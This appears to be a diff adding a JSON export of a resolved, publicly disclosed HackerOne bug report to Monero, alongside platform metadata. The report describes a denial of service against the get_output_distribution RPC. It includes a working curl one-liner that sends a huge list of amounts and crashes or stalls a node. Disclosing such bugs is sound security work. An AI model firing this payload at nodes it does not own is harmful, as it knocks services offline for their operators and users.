@@ -1,0 +1,116 @@
+{
+  "id": 1379707,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzc5NzA3",
+  "url": "https://hackerone.com/reports/1379707",
+  "title": "RPC call crashes node",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-10-24T15:19:11.375Z",
+  "submitted_at": "2021-10-24T15:19:11.435Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "xfang",
+    "url": "/xfang",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-08-20T03:41:29.301Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-08-20T03:41:29.238Z",
+  "team_member_agreed_on_going_public_at": "2022-08-15T02:03:24.304Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nPassing a large list of amounts to the `get_output_distribution` call crashes a remote node, after maybe 90 seconds of keeping it busy.\n\n## Releases Affected:\n\n  * Probably all\n\n## Steps To Reproduce:\n```\nvalues=`echo $(seq 0 500 900000)|sed -e 's/ /,/g'` ; curl http://127.0.0.1:38081/json_rpc -d '{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"get_output_distribution\",\"params\":{\"amounts\": ['$values'], \"from_height\": 100, \"cumulative\": false}' -H 'Content-Type: application/json'\n```\nReduce the 900000 number a bit and instead of crashing the daemon, it'll do a denial of service, like 90 seconds per call, making it hard for anyone else to use that call.\n\n\n## Supporting Material/References:\n\n  * Unnecessary. The attack is  straightforward and compelling.\n\n## Housekeeping\n\nPayment address: ████\n\n## Impact\n\nAn attacker can crash any remote node that exposes `get_output_distribution` or tie up availability of that function call. I think that's serious.",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-09-14T02:03:24.385Z",
+  "allow_singular_disclosure_after": -44712925.408710524,
+  "singular_disclosure_allowed": true,
+  "vote_count": 28,
+  "voters": [
+    "wagde",
+    "zy9ard3",
+    "tosun",
+    "h4x0r_dz",
+    "official_blackhat13",
+    "shivammusic",
+    "sey194",
+    "agalarov",
+    "stigward",
+    "sen7in3l_security",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
